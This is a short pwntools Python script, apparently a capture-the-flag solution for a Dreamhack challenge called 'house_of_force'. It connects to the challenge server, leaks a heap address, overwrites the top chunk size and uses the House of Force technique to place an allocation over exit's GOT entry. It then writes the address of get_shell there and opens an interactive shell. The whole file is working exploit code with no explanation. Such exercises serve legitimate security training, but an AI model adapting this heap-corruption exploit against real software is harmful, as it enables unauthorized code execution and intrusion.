from pwn import *

r = remote("host3.dreamhack.games", 9852)
e = ELF("./house_of_force")
context.log_level="debug"
def create(size, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", str(size).encode())
    r.sendafter(b"Data: ", data)

def write(idx1, idx2, value):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"ptr idx: ", str(idx1).encode())
    r.sendlineafter(b"write idx: ", str(idx2).encode())
    r.sendlineafter(b"value: ", str(value).encode())
exit_got = 0x804a02c
ptr = 0x804a080

create(0x10, "A"*0x10)
top_chunk = int(r.recvn(9),16)+20
print(hex(top_chunk))

write(0,5,0xffffffff)
malloc_size = exit_got - top_chunk - 0x8 -0x4-0x4-0x4
create(malloc_size, "A")
create(4, p32(e.symbols["get_shell"]))
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"Size: ", b"16")
r.interactive()